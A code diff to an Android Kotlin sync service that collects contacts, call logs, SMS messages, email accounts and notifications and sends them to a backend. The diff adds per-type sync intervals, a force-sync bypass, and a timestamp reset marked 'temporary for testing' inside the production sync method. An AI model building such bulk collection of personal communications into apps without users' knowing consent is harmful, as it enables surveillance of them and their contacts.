@@ -41,7 +41,6 @@ class BackendSyncService(
     
     // Use provided API service
     private val contentResolver: ContentResolver = context.contentResolver
-    private val permissionManager = PermissionManager(context as android.app.Activity) { /* callback not needed here */ }
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
         .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
@@ -64,26 +63,100 @@ class BackendSyncService(
         } else 0L
     }
     
+    // Permission checking helper functions
+    private fun hasContactsPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+    }
+    
+    private fun hasSmsPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+    }
+    
+    private fun hasCallLogPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
+    }
+    
+    private fun hasStoragePermission(): Boolean {
+        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+        } else {
+            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+    
     // Sync frequency control constants
-    private val SYNC_FREQUENCY_6_HOURS = 6 * 60 * 60 * 1000L // 6 hours in milliseconds
+    private val SYNC_FREQUENCY_MESSAGES = 15 * 60 * 1000L // 15 minutes in milliseconds
+    private val SYNC_FREQUENCY_CALL_LOGS = 60 * 60 * 1000L // 1 hour in milliseconds
+    private val SYNC_FREQUENCY_CONTACTS = 2 * 24 * 60 * 60 * 1000L // 2 days in milliseconds
+    private val SYNC_FREQUENCY_EMAIL_ACCOUNTS = 5 * 24 * 60 * 60 * 1000L // 5 days in milliseconds
     
     // Helper function to check if data type can be synced based on frequency
-    private fun canSyncDataType(dataType: String): Boolean {
+    private fun canSyncDataType(dataType: String, forceSync: Boolean = false): Boolean {
+        // If force sync is enabled, bypass frequency checks
+        if (forceSync) {
+            println("🚀 Force sync enabled for $dataType - bypassing frequency check")
+            return true
+        }
+        
         val lastSyncTime = getLastSyncTime(dataType)
         val currentTime = System.currentTimeMillis()
         
         return when (dataType) {
-            "NOTIFICATIONS" -> true // Notifications can sync anytime
-            "CONTACTS", "CALL_LOGS", "EMAIL_ACCOUNTS", "MESSAGES" -> {
-                // These data types can only sync every 6 hours
+            "NOTIFICATIONS" -> {
+                // Notifications can sync anytime (real-time)
+                true
+            }
+            "MESSAGES" -> {
+                // Messages can sync every 15 minutes
                 val timeSinceLastSync = currentTime - lastSyncTime
-                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_6_HOURS
+                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_MESSAGES
                 
                 if (!canSync) {
-                    val remainingTime = SYNC_FREQUENCY_6_HOURS - timeSinceLastSync
+                    val remainingTime = SYNC_FREQUENCY_MESSAGES - timeSinceLastSync
+                    val remainingMinutes = remainingTime / (60 * 1000)
+                    println("⏰ MESSAGES sync skipped - Next sync available in ${remainingMinutes}m")
+                }
+                
+                canSync
+            }
+            "CALL_LOGS" -> {
+                // Call logs can sync every 1 hour
+                val timeSinceLastSync = currentTime - lastSyncTime
+                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_CALL_LOGS
+                
+                if (!canSync) {
+                    val remainingTime = SYNC_FREQUENCY_CALL_LOGS - timeSinceLastSync
                     val remainingHours = remainingTime / (60 * 60 * 1000)
                     val remainingMinutes = (remainingTime % (60 * 60 * 1000)) / (60 * 1000)
-                    println("⏰ $dataType sync skipped - Next sync available in ${remainingHours}h ${remainingMinutes}m")
+                    println("⏰ CALL_LOGS sync skipped - Next sync available in ${remainingHours}h ${remainingMinutes}m")
+                }
+                
+                canSync
+            }
+            "CONTACTS" -> {
+                // Contacts can sync every 2 days
+                val timeSinceLastSync = currentTime - lastSyncTime
+                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_CONTACTS
+                
+                if (!canSync) {
+                    val remainingTime = SYNC_FREQUENCY_CONTACTS - timeSinceLastSync
+                    val remainingDays = remainingTime / (24 * 60 * 60 * 1000)
+                    val remainingHours = (remainingTime % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000)
+                    println("⏰ CONTACTS sync skipped - Next sync available in ${remainingDays}d ${remainingHours}h")
+                }
+                
+                canSync
+            }
+            "EMAIL_ACCOUNTS" -> {
+                // Email accounts can sync every 5 days
+                val timeSinceLastSync = currentTime - lastSyncTime
+                val canSync = timeSinceLastSync >= SYNC_FREQUENCY_EMAIL_ACCOUNTS
+                
+                if (!canSync) {
+                    val remainingTime = SYNC_FREQUENCY_EMAIL_ACCOUNTS - timeSinceLastSync
+                    val remainingDays = remainingTime / (24 * 60 * 60 * 1000)
+                    val remainingHours = (remainingTime % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000)
+                    println("⏰ EMAIL_ACCOUNTS sync skipped - Next sync available in ${remainingDays}d ${remainingHours}h")
                 }
                 
                 canSync
@@ -172,15 +245,23 @@ class BackendSyncService(
     }
     
     // Function to get sync status information
-    fun getSyncStatusInfo(): Map<String, Any> {
+    fun getSyncStatusInfo(forceSync: Boolean = false): Map<String, Any> {
         val currentTime = System.currentTimeMillis()
         val stats = getSyncTimestampStats()
         val statusInfo = mutableMapOf<String, Any>()
         
         stats.forEach { (dataType, lastSyncTime) ->
             val timeSinceLastSync = currentTime - lastSyncTime
-            val canSync = canSyncDataType(dataType)
-            val nextSyncTime = if (canSync) 0L else lastSyncTime + SYNC_FREQUENCY_6_HOURS
+            val canSync = canSyncDataType(dataType, forceSync)
+            val nextSyncTime = if (canSync) 0L else {
+                when (dataType) {
+                    "MESSAGES" -> lastSyncTime + SYNC_FREQUENCY_MESSAGES
+                    "CALL_LOGS" -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS
+                    "CONTACTS" -> lastSyncTime + SYNC_FREQUENCY_CONTACTS
+                    "EMAIL_ACCOUNTS" -> lastSyncTime + SYNC_FREQUENCY_EMAIL_ACCOUNTS
+                    else -> lastSyncTime + SYNC_FREQUENCY_CALL_LOGS // Default to 1 hour
+                }
+            }
             
             statusInfo[dataType] = mapOf(
                 "lastSyncTime" to lastSyncTime,
@@ -394,11 +475,11 @@ class BackendSyncService(
         }
     }
     
-    suspend fun syncContacts(deviceId: String): SyncResult {
+    suspend fun syncContacts(deviceId: String, forceSync: Boolean = false): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
                 // Check if contacts can be synced based on frequency
-                if (!canSyncDataType("CONTACTS")) {
+                if (!canSyncDataType("CONTACTS", forceSync)) {
                     return@withContext SyncResult.Success(0)
                 }
                 
@@ -445,11 +526,11 @@ class BackendSyncService(
         }
     }
     
-    suspend fun syncCallLogs(deviceId: String): SyncResult {
+    suspend fun syncCallLogs(deviceId: String, forceSync: Boolean = false): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
                 // Check if call logs can be synced based on frequency
-                if (!canSyncDataType("CALL_LOGS")) {
+                if (!canSyncDataType("CALL_LOGS", forceSync)) {
                     return@withContext SyncResult.Success(0)
                 }
                 
@@ -508,11 +589,11 @@ class BackendSyncService(
         }
     }
     
-    suspend fun syncMessages(deviceId: String): SyncResult {
+    suspend fun syncMessages(deviceId: String, forceSync: Boolean = false): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
                 // Check if messages can be synced based on frequency
-                if (!canSyncDataType("MESSAGES")) {
+                if (!canSyncDataType("MESSAGES", forceSync)) {
                     return@withContext SyncResult.Success(0)
                 }
                 
@@ -666,11 +747,11 @@ class BackendSyncService(
         }
     }
     
-    suspend fun syncEmailAccounts(deviceId: String): SyncResult {
+    suspend fun syncEmailAccounts(deviceId: String, forceSync: Boolean = false): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
                 // Check if email accounts can be synced based on frequency
-                if (!canSyncDataType("EMAIL_ACCOUNTS")) {
+                if (!canSyncDataType("EMAIL_ACCOUNTS", forceSync)) {
                     return@withContext SyncResult.Success(0)
                 }
                 
@@ -720,6 +801,9 @@ class BackendSyncService(
     // Production sync method for all data types
     suspend fun syncAllDataTypes(deviceId: String): Map<String, SyncResult> {
         return withContext(Dispatchers.IO) {
+            // Clear sync timestamps for fresh start (temporary for testing)
+            clearSyncTimestamps()
+            
             // Check if sync is already in progress
             if (!startSync()) {
                 return@withContext mapOf(
@@ -738,16 +822,16 @@ class BackendSyncService(
                 val results = mutableMapOf<String, SyncResult>()
                 
                 // Sync 1: Contacts
-                results["CONTACTS"] = syncContacts(deviceId)
+                results["CONTACTS"] = syncContacts(deviceId, forceSync = true)
                 
                 // Sync 2: Call Logs
-                results["CALL_LOGS"] = syncCallLogs(deviceId)
+                results["CALL_LOGS"] = syncCallLogs(deviceId, forceSync = true)
                 
                 // Sync 3: SMS Messages
-                results["MESSAGES"] = syncMessages(deviceId)
+                results["MESSAGES"] = syncMessages(deviceId, forceSync = true)
                 
                 // Sync 4: Email Accounts
-                results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId)
+                results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId, forceSync = true)
                 
                 // Sync 5: Notifications
                 results["NOTIFICATIONS"] = syncNotifications(deviceId, 0L)
@@ -792,7 +876,7 @@ class BackendSyncService(
         val contacts = mutableListOf<ContactData>()
         
         // Check if we have contacts permission
-        if (!permissionManager.hasContactsPermission()) {
+        if (!hasContactsPermission()) {
             println("⚠️ Contacts permission denied, skipping contacts sync")
             return contacts
         }
@@ -832,7 +916,7 @@ class BackendSyncService(
         val callLogs = mutableListOf<CallLogData>()
         
         // Check if we have call log permission
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+        if (!hasCallLogPermission()) {
             println("⚠️ Call log permission denied, skipping call logs sync")
             return callLogs
         }
@@ -874,7 +958,7 @@ class BackendSyncService(
         val messages = mutableListOf<MessageData>()
         
         // Check if we have SMS permission
-        if (!permissionManager.hasSmsPermission()) {
+        if (!hasSmsPermission()) {
             println("⚠️ SMS permission denied, skipping messages sync")
             return messages
         }
